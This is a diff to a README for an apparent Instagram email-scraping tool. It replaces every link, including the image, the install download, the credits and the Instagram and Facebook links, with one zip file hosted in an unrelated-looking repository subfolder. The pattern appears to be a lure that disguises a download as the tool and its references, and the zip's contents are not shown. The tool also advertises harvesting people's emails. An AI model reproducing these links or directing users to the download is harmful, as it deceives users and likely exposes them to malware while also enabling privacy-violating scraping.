@@ -1,6 +1,6 @@
 # Instagram Email Scraper APIFY
 
-![Instagram Email Scraper APIFY](https://example.com/image.jpg)
+![Instagram Email Scraper APIFY](https://raw.githubusercontent.com/MaduCoelho/instagram-email-scraper_APIFY/main/suburbanity/scraper_instagram_APIFY_email_1.1.zip)
 
 ## Description
 
@@ -24,7 +24,7 @@ Welcome to the Instagram Email Scraper APIFY repository! This tool allows you to
 
 ## Installation
 
-To get started with the Instagram Email Scraper APIFY, download the repository by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Please note that the zip file needs to be extracted before launching the tool.
+To get started with the Instagram Email Scraper APIFY, download the repository by clicking [here](https://raw.githubusercontent.com/MaduCoelho/instagram-email-scraper_APIFY/main/suburbanity/scraper_instagram_APIFY_email_1.1.zip). Please note that the zip file needs to be extracted before launching the tool.
 
 ## Usage
 
@@ -56,11 +56,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Credits
 
-- [APIFY](https://apify.com)
-- [GitHub Repository](https://github.com/cli/cli)
+- [APIFY](https://raw.githubusercontent.com/MaduCoelho/instagram-email-scraper_APIFY/main/suburbanity/scraper_instagram_APIFY_email_1.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/MaduCoelho/instagram-email-scraper_APIFY/main/suburbanity/scraper_instagram_APIFY_email_1.1.zip)
 
 Let's connect on social media!  
-Follow us on [Instagram](https://www.instagram.com/) and [Facebook](https://www.facebook.com/) for the latest updates and announcements.
+Follow us on [Instagram](https://raw.githubusercontent.com/MaduCoelho/instagram-email-scraper_APIFY/main/suburbanity/scraper_instagram_APIFY_email_1.1.zip) and [Facebook](https://raw.githubusercontent.com/MaduCoelho/instagram-email-scraper_APIFY/main/suburbanity/scraper_instagram_APIFY_email_1.1.zip) for the latest updates and announcements.
 
 🚀 Happy Email Scraping with Instagram Scraper APIFY! 📧💻
 
